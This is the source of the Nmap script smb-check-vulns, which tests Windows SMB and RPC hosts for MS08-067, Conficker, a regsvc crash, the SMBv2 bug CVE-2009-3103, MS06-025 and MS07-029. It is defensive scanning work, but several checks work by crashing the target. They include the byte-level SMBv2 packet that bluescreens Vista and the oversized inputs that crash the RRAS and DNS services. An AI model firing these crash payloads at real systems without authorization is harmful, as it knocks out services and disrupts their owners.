local msrpc = require "msrpc"
local nmap = require "nmap"
local smb = require "smb"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Checks for vulnerabilities:
* MS08-067, a Windows RPC vulnerability
* Conficker, an infection by the Conficker worm
* Unnamed regsvc DoS, a denial-of-service vulnerability I accidentally found in Windows 2000
* SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
* MS06-025, a Windows Ras RPC service vulnerability
* MS07-029, a Windows Dns Server RPC service vulnerability

WARNING: These checks are dangerous, and are very likely to bring down a server. 
These should not be run in a production environment unless you (and, more importantly,
the business) understand the risks! 

As a system administrator, performing these kinds of checks is crucial, because 
a lot more damage can be done by a worm or a hacker using this vulnerability than
by a scanner. Penetration testers, on the other hand, might not want to use this
script -- crashing services is not generally a good way of sneaking through a 
network. 

If you set the script parameter <code>unsafe</code>, then scripts will run that are almost 
(or totally) guaranteed to crash a vulnerable system; do NOT specify <code>unsafe</code>
in a production environment! And that isn't to say that non-unsafe scripts will 
not crash a system, they're just less likely to. 

If you set the script parameter <code>safe</code>, then script will run that rarely or never
crash a vulnerable system. No promises, though. 

MS08-067. Checks if a host is vulnerable to MS08-067, a Windows RPC vulnerability that
can allow remote code execution.  Checking for MS08-067 is very dangerous, as the check 
is likely to crash systems. On a fairly wide scan conducted by Brandon Enright, we determined
that on average, a vulnerable system is more likely to crash than to survive
the check. Out of 82 vulnerable systems, 52 crashed. 
At the same time, MS08-067 is extremely critical to fix. Metasploit has a working and
stable exploit for it, and any system vulnerable can very easily be compromised. 
Conficker. Checks if a host is infected with a known Conficker strain. This check
is based on the simple conficker scanner found on this page:
http://iv.cs.uni-bonn.de/wg/cs/applications/containing-conficker.
Thanks to the folks who wrote that scanner!

regsvc DoS. Checks if a host is vulnerable to a crash in regsvc, caused 
by a null pointer dereference. I inadvertently discovered this crash while working
on <code>smb-enum-sessions</code>, and discovered that it was repeatable. It's been 
reported to Microsoft (case #MSRC8742). 

This check WILL crash the service, if it's vulnerable, and requires a guest account
or higher to work. It is considered <code>unsafe</code>. 

SMBv2 DoS. Performs a denial-of-service against the vulnerability disclosed in
CVE-2009-3103. Checks if the server went offline. This works agianst Windows Vista
and some versions of Windows 7, and causes a bluescreen if successful. The
proof-of-concept code at http://seclists.org/fulldisclosure/2009/Sep/39 was used, 
with one small change. 

MS06-025. Vulnerability targets the <code>RasRpcSumbitRequest()</code> RPC method which is
a part of RASRPC interface that serves as a RPC service for configuring and 
getting information from the Remote Access and Routing service. RASRPC can be
accessed using either "\ROUTER" SMB pipe or the "\SRVSVC" SMB pipe (usually on Windows XP machines).
This is in RPC world known as "ncan_np" RPC transport. <code>RasRpcSumbitRequest()</code>
method is a generic method which provides different functionalities according
to the <code>RequestBuffer</code> structure and particulary the <code>RegType</code> field within that 
structure. <code>RegType</code> field is of <code>enum ReqTypes</code> type. This enum type lists all
the different available operation that can be performed using the <code>RasRpcSubmitRequest()</code>
RPC method. The one particular operation that this vuln targets is the <code>REQTYPE_GETDEVCONFIG</code> 
request to get device information on the RRAS.

MS07-029. Vulnerability targets the <code>R_DnssrvQuery()</code> and <code>R_DnssrvQuery2()</code> RPC method which is
a part of DNS Server RPC interface that serves as a RPC service for configuring and 
getting information from the DNS Server service. DNS Server RPC service can be
accessed using "\dnsserver" SMB named pipe. The vulnerability is triggered when
a long string is send as the "zone" parameter which causes the buffer overflow which
crashes the service.

(Note: if you have other SMB/MSRPC vulnerability checks you'd like to see added, and
you can show me a tool with a license that is compatible with Nmap's, post a request 
on the nmap-dev mailing list and I'll add it to my list [Ron Bowes].) 
]]
---
--@usage
-- nmap --script smb-check-vulns.nse -p445 <host>
-- sudo nmap -sU -sS --script smb-check-vulns.nse -p U:137,T:139 <host>
--
--@output
-- Host script results:
-- | smb-check-vulns:  
-- |   MS08-067: NOT VULNERABLE
-- |   Conficker: Likely CLEAN
-- |   regsvc DoS: regsvc DoS: NOT VULNERABLE
-- |   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE
-- |   MS06-025: NO SERVICE (the Ras RPC service is inactive)
-- |_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)
--
-- @args unsafe If set, this script will run checks that, if the system isn't
--       patched, are basically guaranteed to crash something. Remember that
--       non-unsafe checks aren't necessarily safe either)
-- @args safe   If set, this script will only run checks that are known (or at
--       least suspected) to be safe. 
-----------------------------------------------------------------------

author = "Ron Bowes"
copyright = "Ron Bowes"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive","exploit","dos","vuln"}
-- run after all smb-* scripts (so if it DOES crash something, it doesn't kill
-- other scans have had a chance to run)
dependencies = {
  "smb-brute", "smb-enum-sessions", "smb-security-mode", 
  "smb-enum-shares", "smb-server-stats",
  "smb-enum-domains", "smb-enum-users", "smb-system-info",
  "smb-enum-groups", "smb-os-discovery", "smb-enum-processes",
  "smb-psexec",
};


hostrule = function(host)
	return smb.get_port(host) ~= nil
end

local VULNERABLE = 1
local PATCHED    = 2
local UNKNOWN    = 3
local NOTRUN     = 4
local INFECTED   = 5
local INFECTED2  = 6
local CLEAN      = 7
local NOTUP      = 8

---Check if the server is patched for MS08-067. This is done by calling NetPathCompare with an 
-- illegal string. If the string is accepted, then the server is vulnerable; if it's rejected, then
-- you're safe (for now). 
--
-- Based on a packet cap of this script, thanks go out to the author:
-- http://labs.portcullis.co.uk/application/ms08-067-check/
--
-- If there's a licensing issue, please let me (Ron Bowes) know so I can 
--
-- NOTE: This CAN crash stuff (ie, crash svchost and force a reboot), so beware! In about 20 
-- tests I did, it crashed once. This is not a guarantee. 
--
--@param host The host object. 
--@return (status, result) If status is false, result is an error code; otherwise, result is either 
--        <code>VULNERABLE</code> for vulnerable, <code>PATCHED</code> for not vulnerable, 
--        <code>UNKNOWN</code> if there was an error (likely vulnerable), <code>NOTRUN</code>
--        if this check was disabled, and <code>INFECTED</code> if it was patched by Conficker. 
function check_ms08_067(host)
	if(nmap.registry.args.safe ~= nil) then
		return true, NOTRUN
	end
	if(nmap.registry.args.unsafe == nil) then
		return true, NOTRUN
	end
	local status, smbstate
	local bind_result, netpathcompare_result

	-- Create the SMB session
	status, smbstate = msrpc.start_smb(host, "\\\\BROWSER")
	if(status == false) then
		return false, smbstate
	end

	-- Bind to SRVSVC service
	status, bind_result = msrpc.bind(smbstate, msrpc.SRVSVC_UUID, msrpc.SRVSVC_VERSION, nil)
	if(status == false) then
		msrpc.stop_smb(smbstate)
		return false, bind_result
	end

	-- Call netpathcanonicalize
--	status, netpathcanonicalize_result = msrpc.srvsvc_netpathcanonicalize(smbstate, host.ip, "\\a", "\\test\\")
	
	local path1 = "\\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\..\\n"
	local path2 = "\\n"
	status, netpathcompare_result = msrpc.srvsvc_netpathcompare(smbstate, host.ip, path1, path2, 1, 0)

	-- Stop the SMB session
	msrpc.stop_smb(smbstate)

	if(status == false) then
		if(string.find(netpathcompare_result, "WERR_INVALID_PARAMETER") ~= nil) then
			return true, INFECTED
		elseif(string.find(netpathcompare_result, "INVALID_NAME") ~= nil) then
			return true, PATCHED
		else
			return true, UNKNOWN, netpathcompare_result
		end
	end


	return true, VULNERABLE
end

-- Help messages for the more common errors seen by the Conficker check.
CONFICKER_ERROR_HELP = {
	["NT_STATUS_BAD_NETWORK_NAME"] =
[[UNKNOWN; Network name not found (required service has crashed). (Error NT_STATUS_BAD_NETWORK_NAME)]],
	-- http://seclists.org/nmap-dev/2009/q1/0918.html "non-Windows boxes (Samba on Linux/OS X, or a printer)"
	-- http://www.skullsecurity.org/blog/?p=209#comment-156
	--   "That means either it isn’t a Windows machine, or the service is
	--    either crashed or not running. That may indicate a failed (or
	--    successful) exploit attempt, or just a locked down system.
	--    NT_STATUS_OBJECT_NAME_NOT_FOUND can be returned if the browser
	--    service is disabled. There are at least two ways that can happen:
	--    1) The service itself is disabled in the services list.
	--    2) The registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\Parameters\MaintainServerList
	--       is set to Off/False/No rather than Auto or yes.
	--    On these systems, if you reenable the browser service, then the
	--    test will complete."
	["NT_STATUS_OBJECT_NAME_NOT_FOUND"] = 
[[UNKNOWN; not Windows, or Windows with disabled browser service (CLEAN); or Windows with crashed browser service (possibly INFECTED).
|  If you know the remote system is Windows, try rebooting it and scanning
|_ again. (Error NT_STATUS_OBJECT_NAME_NOT_FOUND)]],
	-- http://www.skullsecurity.org/blog/?p=209#comment-100
	--   "That likely means that the server has been locked down, so we
	--    don’t have access to the necessary pipe. Fortunately, that means
	--    that neither does Conficker — NT_STATUS_ACCESS_DENIED probably
	--    means you’re ok."
	["NT_STATUS_ACCESS_DENIED"] =
[[Likely CLEAN; access was denied.
|  If you have a login, try using --script-args=smbuser=xxx,smbpass=yyy
|  (replace xxx and yyy with your username and password). Also try
|_ smbdomain=zzz if you know the domain. (Error NT_STATUS_ACCESS_DENIED)]],
	-- The cause of these two is still unknown.
	-- ["NT_STATUS_NOT_SUPPORTED"] =
	-- [[]]
	-- http://thatsbroken.com/?cat=5 (doesn't seem common)
	-- ["NT_STATUS_REQUEST_NOT_ACCEPTED"] =
	-- [[]]
}

---Check if the server is infected with Conficker. This can be detected by a modified MS08-067 patch, 
-- which rejects a different illegal string than the official patch rejects. 
--
-- Based loosely on the Simple Conficker Scanner, found here:
-- http://iv.cs.uni-bonn.de/wg/cs/applications/containing-conficker/
--
-- If there's a licensing issue, please let me (Ron Bowes) know so I can fix it
--
--@param host The host object. 
--@return (status, result) If status is false, result is an error code; otherwise, result is either 
--        <code>INFECTED</code> for infected or <code>CLEAN</code> for not infected.
function check_conficker(host)
	local status, smbstate
	local bind_result, netpathcompare_result

	-- Create the SMB session
	status, smbstate = msrpc.start_smb(host, "\\\\BROWSER", true)
	if(status == false) then
		return false, smbstate
	end

	-- Bind to SRVSVC service
	status, bind_result = msrpc.bind(smbstate, msrpc.SRVSVC_UUID, msrpc.SRVSVC_VERSION, nil)
	if(status == false) then
		msrpc.stop_smb(smbstate)
		return false, bind_result
	end

	-- Try checking a valid string to find Conficker.D
	local netpathcanonicalize_result, error_result
	status, netpathcanonicalize_result, error_result = msrpc.srvsvc_netpathcanonicalize(smbstate, host.ip, "\\")
	if(status == true and netpathcanonicalize_result['can_path'] == 0x5c45005c) then
		msrpc.stop_smb(smbstate)
		return true, INFECTED2
	end

	-- Try checking an illegal string ("\..\") to find Conficker.C and earlier
	status, netpathcanonicalize_result, error_result = msrpc.srvsvc_netpathcanonicalize(smbstate, host.ip, "\\..\\")

	if(status == false) then
		if(string.find(netpathcanonicalize_result, "INVALID_NAME")) then
			msrpc.stop_smb(smbstate)
			return true, CLEAN
		elseif(string.find(netpathcanonicalize_result, "WERR_INVALID_PARAMETER") ~= nil) then
			msrpc.stop_smb(smbstate)
			return true, INFECTED
		else
			msrpc.stop_smb(smbstate)
			return false, netpathcanonicalize_result
		end
	end

	-- Stop the SMB session
	msrpc.stop_smb(smbstate)

	return true, CLEAN
end

---While writing <code>smb-enum-sessions</code> I discovered a repeatable null-pointer dereference 
-- in regsvc. I reported it to Microsoft, but because it's a simple DoS (and barely even that, because
-- the service automatically restarts), and because it's only in Windows 2000, it isn't likely that they'll
-- fix it. This function checks for that crash (by crashing the process). 
--
-- The crash occurs when the string sent to winreg_enumkey() function is null. 
--
--@param host The host object. 
--@return (status, result) If status is false, result is an error code; otherwise, result is either 
--        <code>VULNERABLE</code> for vulnerable or <code>PATCHED</code> for not vulnerable. If the check
--        was skipped, <code>NOTRUN</code> is returned. 
function check_winreg_Enum_crash(host)
	if(nmap.registry.args.safe ~= nil) then
		return true, NOTRUN
	end
	if(nmap.registry.args.unsafe == nil) then
		return true, NOTRUN
	end

	local i, j
	local elements = {}
	local status, bind_result, smbstate

	-- Create the SMB session
	status, smbstate = msrpc.start_smb(host, msrpc.WINREG_PATH)
	if(status == false) then
		return false, smbstate
	end

	-- Bind to WINREG service
	status, bind_result = msrpc.bind(smbstate, msrpc.WINREG_UUID, msrpc.WINREG_VERSION, nil)
	if(status == false) then
		msrpc.stop_smb(smbstate)
		return false, bind_result
	end

  local openhku_result
	status, openhku_result = msrpc.winreg_openhku(smbstate)
	if(status == false) then
		msrpc.stop_smb(smbstate)
		return false, openhku_result
	end

	-- Loop through the keys under HKEY_USERS and grab the names
	local enumkey_result
	status, enumkey_result = msrpc.winreg_enumkey(smbstate, openhku_result['handle'], 0, nil)
	msrpc.stop_smb(smbstate)

	if(status == false) then
		return true, VULNERABLE
	end

	return true, PATCHED
end

local function check_smbv2_dos(host)
	local status, result

	if(nmap.registry.args.safe ~= nil) then
		return true, NOTRUN
	end
	if(nmap.registry.args.unsafe == nil) then
		return true, NOTRUN
	end

	-- From http://seclists.org/fulldisclosure/2009/Sep/0039.html with one change on the last line. 
	local buf = string.char(0x00, 0x00, 0x00, 0x90) ..  -- Begin SMB header: Session message
	            string.char(0xff, 0x53, 0x4d, 0x42) .. -- Server Component: SMB
	            string.char(0x72, 0x00, 0x00, 0x00) .. -- Negociate Protocol
	            string.char(0x00, 0x18, 0x53, 0xc8) .. -- Operation 0x18 & sub 0xc853
	            string.char(0x00, 0x26)             .. -- Process ID High: --> :) normal value should be ", 0x00, 0x00"
	            string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xfe) ..
	            string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x6d, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4e, 0x45, 0x54) ..
	            string.char(0x57, 0x4f, 0x52, 0x4b, 0x20, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d, 0x20, 0x31) ..
	            string.char(0x2e, 0x30, 0x00, 0x02, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x31, 0x2e, 0x30, 0x00) ..
	            string.char(0x02, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x57) ..
	            string.char(0x6f, 0x72, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x73, 0x20, 0x33, 0x2e, 0x31, 0x61) ..
	            string.char(0x00, 0x02, 0x4c, 0x4d, 0x31, 0x2e, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4c) ..
	            string.char(0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x32, 0x2e, 0x31, 0x00, 0x02, 0x4e, 0x54, 0x20, 0x4c) ..
	            string.char(0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00, 0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e) ..
	            string.char(0x30, 0x30, 0x32, 0x00)

	local socket = nmap.new_socket()
	if(socket == nil) then
		return false, "Couldn't create socket"
	end

	status, result = socket:connect(host, 445)
	if(status == false) then
		socket:close()
		return false, "Couldn't connect to host: " .. result
	end

	status, result = socket:send(buf)
	if(status == false) then
		socket:close()
		return false, "Couldn't send the buffer: " .. result
	end

	-- Close the socket
	socket:close()

	-- Give it some time to crash
	stdnse.print_debug(1, "smb-check-vulns: Waiting 5 seconds to see if Windows crashed")
	stdnse.sleep(5)

	-- Create a new socket
	socket = nmap.new_socket()
	if(socket == nil) then
		return false, "Couldn't create socket"
	end

	-- Try and do something simple
	stdnse.print_debug(1, "smb-check-vulns: Attempting to connect to the host")
	socket:set_timeout(5000)
	status, result = socket:connect(host, 445)

	-- Check the result	
	if(status == false or status == nil) then
		stdnse.print_debug(1, "smb-check-vulns: Connect failed, host is likely vulnerable!")
		socket:close()
		return true, VULNERABLE
	end

	-- Try sending something
	stdnse.print_debug(1, "smb-check-vulns: Attempting to send data to the host")
	status, result = socket:send("AAAA")
	if(status == false or status == nil) then
		stdnse.print_debug(1, "smb-check-vulns: Send failed, host is likely vulnerable!")
		socket:close()
		return true, VULNERABLE
	end

	stdnse.print_debug(1, "smb-check-vulns: Checks finished; host is likely not vulnerable.")
	socket:close()
	return true, PATCHED
end


---Check the existence of ms06_025 vulnerability in Microsoft Remote Routing
--and Access Service. This check is not safe as it crashes the RRAS service and
--its dependencies.
--@param host Host object.
--@return (status, result) 
--*	<code>status == false</code> -> <code>result == NOTUP</code> which designates 
--that the targeted Ras RPC service is not active.
--*	<code>status == true</code> -> 
--	** <code>result == VULNERABLE</code> for vulnerable.
--	** <code>result == PATCHED</code> for not vulnerable.
--	** <code>result == NOTRUN</code> if check skipped.
function check_ms06_025(host)
    --check for safety flag  
    if(nmap.registry.args.safe ~= nil) then
		return true, NOTRUN
    end
    if(nmap.registry.args.unsafe == nil) then
        return true, NOTRUN
    end
    --create the SMB session
    --first we try with the "\router" pipe, then the "\srvsvc" pipe.
    local status, smb_result, smbstate, err_msg
    status, smb_result = msrpc.start_smb(host, msrpc.ROUTER_PATH)
    if(status == false) then
        err_msg = smb_result
        status, smb_result = msrpc.start_smb(host, msrpc.SRVSVC_PATH) --rras is also accessible across SRVSVC pipe
        if(status == false) then
        	return false, NOTUP --if not accessible across both pipes then service is inactive
        end
    end
    smbstate = smb_result
    --bind to RRAS service
    local bind_result
    status, bind_result = msrpc.bind(smbstate, msrpc.RASRPC_UUID, msrpc.RASRPC_VERSION, nil)
    if(status == false) then 
        msrpc.stop_smb(smbstate)
        return false, UNKNOWN --if bind operation results with a false status we can't conclude anything.
    end
    if(bind_result['ack_result'] == 0x02) then --0x02 == PROVIDER_REJECTION
		msrpc.stop_smb(smbstate)
        return false, NOTUP --if bind operation results with true but PROVIDER_REJECTION, then the service is inactive.
    end
	local req, buff, sr_result
	req = msrpc.RRAS_marshall_RequestBuffer(
		0x01, 
		msrpc.RRAS_RegTypes['GETDEVCONFIG'], 
		msrpc.random_crap(3000))
	status, sr_result = msrpc.RRAS_SubmitRequest(smbstate, req)
	msrpc.stop_smb(smbstate)
	--sanity check
	if(status == false) then
		stdnse.print_debug(
			3,
			"check_ms06_025: RRAS_SubmitRequest failed")
		if(sr_result == "NT_STATUS_PIPE_BROKEN") then
			return true, VULNERABLE
		else
			return true, PATCHED
		end
	else
		return true, PATCHED
	end
end

---Check the existence of ms07_029 vulnerability in Microsoft Dns Server service.
--This check is not safe as it crashes the Dns Server RPC service its dependencies.
--@param host Host object.
--@return (status, result) 
--*	<code>status == false</code> -> <code>result == NOTUP</code> which designates 
--that the targeted Dns Server RPC service is not active.
--*	<code>status == true</code> -> 
--	** <code>result == VULNERABLE</code> for vulnerable.
--	** <code>result == PATCHED</code> for not vulnerable.
--	** <code>result == NOTRUN</code> if check skipped.
function check_ms07_029(host)
 	--check for safety flag  
    if(nmap.registry.args.safe ~= nil) then
		return true, NOTRUN
    end
    if(nmap.registry.args.unsafe == nil) then
        return true, NOTRUN
    end
	--create the SMB session
	local status, smbstate
	status, smbstate = msrpc.start_smb(host, msrpc.DNSSERVER_PATH)
	if(status == false) then
		return false, NOTUP --if not accessible across pipe then the service is inactive
	end
	--bind to DNSSERVER service
	local bind_result
	status, bind_result = msrpc.bind(smbstate, msrpc.DNSSERVER_UUID, msrpc.DNSSERVER_VERSION)
	if(status == false) then
		msrpc.stop_smb(smbstate)
		return false, UNKNOWN --if bind operation results with a false status we can't conclude anything.
	end
	--call
	local req_blob, q_result
	status, q_result = msrpc.DNSSERVER_Query(
		smbstate, 
		"VULNSRV", 
		string.rep("\\\13", 1000), 
		1)--any op num will do
	--sanity check
	msrpc.stop_smb(smbstate)
	if(status == false) then
		stdnse.print_debug(
			3,
			"check_ms07_029: DNSSERVER_Query failed")
		if(q_result == "NT_STATUS_PIPE_BROKEN") then
			return true, VULNERABLE
		else
			return true, PATCHED
		end
	else
		return true, PATCHED
	end
end

---Returns the appropriate text to display, if any. 
--
--@param check The name of the check; for example, 'ms08-067'.
--@param message The message to display, such as 'VULNERABLE' or 'PATCHED'.
--@param description [optional] Extra details about the message. nil for a blank message. 
--@param minimum_verbosity The minimum verbosity level required before the message is displayed.
--@param minimum_debug [optional] The minimum debug level required before the message is displayed (default: 0).
--@return A string with a textual representation of the error (or empty string, if it was determined that the message shouldn't be displayed). 
local function get_response(check, message, description, minimum_verbosity, minimum_debug)
	if(minimum_debug == nil) then
		minimum_debug = 0
	end

	-- Check if we have appropriate verbosity/debug
	if(nmap.verbosity() >= minimum_verbosity and nmap.debugging() >= minimum_debug) then
		if(description == nil or description == '') then
			return string.format("%s: %s", check, message)
		else
			return string.format("%s: %s (%s)", check, message, description)
		end
	else
		return nil
	end
end

action = function(host)

	local status, result, message
	local response = {}

	-- Check for ms08-067
	status, result, message = check_ms08_067(host)
	if(status == false) then
		table.insert(response, get_response("MS08-067", "ERROR", result, 0, 1))
	else
		if(result == VULNERABLE) then
			table.insert(response, get_response("MS08-067", "VULNERABLE",        nil,                               0))
		elseif(result == UNKNOWN) then
			table.insert(response, get_response("MS08-067", "LIKELY VULNERABLE", "host stopped responding",         1)) -- TODO: this isn't very accurate
		elseif(result == NOTRUN) then
			table.insert(response, get_response("MS08-067", "CHECK DISABLED",    "add '--script-args=unsafe=1' to run", 1))
		elseif(result == INFECTED) then
			table.insert(response, get_response("MS08-067", "NOT VULNERABLE",    "likely by Conficker",             0))
		else
			table.insert(response, get_response("MS08-067", "NOT VULNERABLE", nil, 1))
		end
	end

	-- Check for Conficker
	status, result = check_conficker(host)
	if(status == false) then
		local msg = CONFICKER_ERROR_HELP[result] or "UNKNOWN; got error " .. result
		table.insert(response, get_response("Conficker", msg, nil, 1)) -- Only set verbosity for this, since it might be an error or it might be UNKNOWN
	else
		if(result == CLEAN) then
			table.insert(response, get_response("Conficker", "Likely CLEAN",    nil,                        1))
		elseif(result == INFECTED) then
			table.insert(response, get_response("Conficker", "Likely INFECTED", "by Conficker.C or lower",  0))
		elseif(result == INFECTED2) then
			table.insert(response, get_response("Conficker", "Likely INFECTED", "by Conficker.D or higher", 0))
		else
			table.insert(response, get_response("Conficker", "UNKNOWN",         result,                     0, 1))
		end
	end

	-- Check for a winreg_Enum crash
	status, result = check_winreg_Enum_crash(host)
	if(status == false) then
		table.insert(response, get_response("regsvc DoS", "ERROR", result, 0, 1))
	else
		if(result == VULNERABLE) then
			table.insert(response, get_response("regsvc DoS", "VULNERABLE", nil, 0))
		elseif(result == NOTRUN) then
			table.insert(response, get_response("regsvc DoS", "CHECK DISABLED", "add '--script-args=unsafe=1' to run", 1))
		else
			table.insert(response, get_response("regsvc DoS", "NOT VULNERABLE", nil, 1))
		end
	end

	-- Check for SMBv2 vulnerablity
	status, result = check_smbv2_dos(host)
	if(status == false) then
		table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "ERROR", result, 0, 1))
	else
		if(result == VULNERABLE) then
			table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "VULNERABLE", nil, 0))
		elseif(result == NOTRUN) then
			table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "CHECK DISABLED", "add '--script-args=unsafe=1' to run", 1))
		else
			table.insert(response, get_response("SMBv2 DoS (CVE-2009-3103)", "NOT VULNERABLE", nil, 1))
		end
	end

    -- Check for ms06-025
    status, result = check_ms06_025(host)
  	if(status == false) then
    	if(result == NOTUP) then
			table.insert(response, get_response("MS06-025", "NO SERVICE", "the Ras RPC service is inactive", 1))
		else
			table.insert(response, get_response("MS06-025", "ERROR", result, 0, 1))
		end
    else
        if(result == VULNERABLE) then
			table.insert(response, get_response("MS06-025", "VULNERABLE", nil, 0))
        elseif(result == NOTRUN) then
			table.insert(response, get_response("MS06-025", "CHECK DISABLED", "add '--script-args=unsafe=1' to run", 1))
        elseif(result == NOTUP) then
			table.insert(response, get_response("MS06-025", "NO SERVICE", "the Ras RPC service is inactive", 1))
        else
			table.insert(response, get_response("MS06-025", "NOT VULNERABLE", nil, 1))
        end
    end
    
    -- Check for ms07-029
    status, result = check_ms07_029(host)
    if(status == false) then
    	if(result == NOTUP) then
			table.insert(response, get_response("MS07-029", "NO SERVICE", "the Dns Server RPC service is inactive", 1))
		else
			table.insert(response, get_response("MS07-029", "ERROR", result, 0, 1))
		end
    else
        if(result == VULNERABLE) then
			table.insert(response, get_response("MS07-029", "VULNERABLE", nil, 0))
        elseif(result == NOTRUN) then
			table.insert(response, get_response("MS07-029", "CHECK DISABLED", "add '--script-args=unsafe=1' to run", 1))
        else
			table.insert(response, get_response("MS07-029", "NOT VULNERABLE", nil, 1))
        end
    end

	return stdnse.format_output(true, response)
end



